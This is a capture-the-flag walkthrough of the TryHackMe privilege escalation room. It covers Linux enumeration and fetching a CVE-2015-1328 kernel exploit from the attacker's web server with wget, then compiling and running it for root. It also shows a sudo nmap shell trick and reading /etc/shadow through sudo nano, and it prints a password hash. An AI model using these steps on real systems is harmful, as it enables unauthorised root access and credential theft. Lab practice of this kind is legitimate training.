# introduction

Privilege escalation is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user

# privileges escalation room of tryhackme

## task 0

### connect to thm network

```
openvpn username.ovpn
```

### connect using ssh to the machine

```
ssh karen@machine-address
then enter the password
```

## task 3 : Enumeration

### 1. What is the hostname of the target system : **wade3763**

```
uname -a
```

it prints system information

### 2. What is the Linux kernel version of the target system : **3.13.0-24-generic**

```
uname -a
```

it prints system information

### 3. What Linux is this : **Ubuntu 14.04 LTS**

```
cat /etc/issue
```

### 4. What version of the Python language is installed on the system :  2.7.6 

```
python --version
```


### 5.What vulnerability seem to affect the kernel of the target system (Enter a CVE number) : CVE-2015-1328

quick search on the internet with the kernel version of the machine

read about it [here](http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

## task 5 :  Privilege Escalation: Kernel Exploits

### What is the content of the flag1.txt file?

1. get the c file of the exploit from [here](https://www.exploit-db.com/exploits/37292) in your attacker machine

2. host a server using python 

```
python3 -m http.server 80
```

3. on the target machine get the file ofs.c (place yourself in tmp folder)

4. compile the file using gcc

5. execute the file and we are done :), we are root

```
$ cd /var/tmp/  
$ wget http://10.8.16.105/ofs.c 
--2022-09-01 12:47:12--  http://10.8.16.105/ofs.c
Connecting to 10.8.16.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3860 (3.8K) [text/x-csrc]
Saving to: ‘ofs.c’

100%[================================>] 3,860       --.-K/s   in 0s      

2022-09-01 12:47:12 (429 MB/s) - ‘ofs.c’ saved [3860/3860]

$ gcc ofs.c -o ofs
$ ./ofs          
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)

```

6. we get the flag1.txt now

```
# find / -name flag1.txt
/home/matt/flag1.txt
# cat /home/matt/flag1.txt
THM-28392872729920
```

## task 6: Sudo

### 1.How many programs can the user "karen" run on the target system with sudo rights : 3
```
$ sudo -l
Matching Defaults entries for karen on ip-10-10-193-45:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-193-45:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```
### 2. What is the content of the flag2.txt file?

```
$ find / -name flag2.txt 2> /dev/null 
/home/ubuntu/flag2.txt
$ cat /home/ubuntu/flag2.txt
THM-402028394
```

### 3. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
```
sudo nmap --interactive
```
read more [here](https://vk9-sec.com/nmap-privilege-escalation/)

### 4. What is the hash of frank's password
```
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

1. run **sudo nano** 
2. ctrl+R
3. /etc/shadow/
4. ctrl+X













